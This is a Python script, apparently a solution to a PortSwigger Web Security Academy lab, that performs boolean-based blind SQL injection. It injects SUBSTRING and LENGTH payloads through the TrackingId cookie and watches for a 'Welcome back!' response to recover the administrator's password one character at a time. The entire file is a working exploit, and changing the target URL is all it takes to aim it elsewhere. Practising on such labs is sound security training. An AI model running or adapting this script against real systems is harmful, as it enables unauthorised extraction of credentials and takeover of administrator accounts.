import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a83005e04e0e40e80f23fd000480019.web-security-academy.net"

session_cookie = {
    "TrackingId": "2Fzgrr17ptA0aysl",
    "session": "6gpXpdYr85mGlN3rBxlkG222yQRhtnWL",
}

letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def request_with_retry(cookies):
    try:
        return requests.get(url, cookies=cookies, verify=False, timeout=(5, 10))
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None


def get_len():
    for i in range(1, 101):
        cookies = session_cookie.copy()
        payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={i}--"
        cookies["TrackingId"] += payload
        r = request_with_retry(cookies)
        if not r:
            continue
        if "Welcome back!" in r.text:
            print(f"[+] Found length of administrator password: {i}")
            return i
    return None


def get_password(length):
    password_chars = []
    for i in range(1, length + 1):
        for c in letters:
            cookies = session_cookie.copy()
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{c}'--"
            cookies["TrackingId"] += payload
            r = request_with_retry(cookies)
            if not r:
                continue
            if "Welcome back!" in r.text:
                print(f"[+] Found character {i} of administrator password: {c}")
                password_chars.append(c)
                break
    return "".join(password_chars)


if __name__ == "__main__":
    length = get_len()
    if length is None:
        print("[!] Could not determine password length.")
    else:
        print(f"[+] Length of administrator password is: {length}")
        print(
            "[*] Now you can use this length to brute-force the password character by character."
        )
        brute_force = get_password(length)
        print(f"[+] Brute-forced administrator password: {brute_force}")
